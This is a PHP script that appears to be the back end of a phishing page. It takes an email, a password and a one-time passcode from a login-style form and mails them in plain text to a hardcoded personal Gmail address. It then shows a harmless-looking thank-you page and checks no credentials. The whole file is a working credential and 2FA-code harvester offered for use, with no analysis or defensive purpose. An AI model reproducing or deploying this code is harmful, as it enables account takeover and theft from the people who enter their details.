<?php
// Start the session to store errors or feedback if needed
session_start();

// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form inputs and sanitize them
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';

    // Validate inputs
    if (empty($email) || empty($password) || empty($otp)) {
        $_SESSION['error'] = "Please fill in all fields.";
        header("Location: index.html"); // Redirect back to the form
        exit();
    }

    // Validate email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $_SESSION['error'] = "Invalid email format.";
        header("Location: index.html"); // Redirect back to the form
        exit();
    }

    // Prepare email subject and message
    $subject = "User Login Details";
    $message = "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "OTP: $otp\n";

    // Prepare email header
    $mailheader = "From: no-reply@example.com\r\n"; // Change the "From" email address if needed

    // Define recipient email address
    $recipient = "itsdestinyrich@gmail.com"; // Change to your email

    // Send email
    if (mail($recipient, $subject, $message, $mailheader)) {
        // Email sent successfully
        echo '
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Contact Form</title>
            <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Poppins&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="style.css">
        </head>
        <body>
            <div class="container">
                <h1>Thank you! Your details have been sent successfully.</h1>
                <p class="back">Go back to the <a href="index.html">homepage</a>.</p>
            </div>
        </body>
        </html>';
    } else {
        // Email sending failed
        $_SESSION['error'] = "Failed to send email. Please try again later.";
        header("Location: index.html"); // Redirect back to the form
        exit();
    }
} else {
    // Redirect to the form if accessed directly
    header("Location: index.html");
    exit();
}
?>
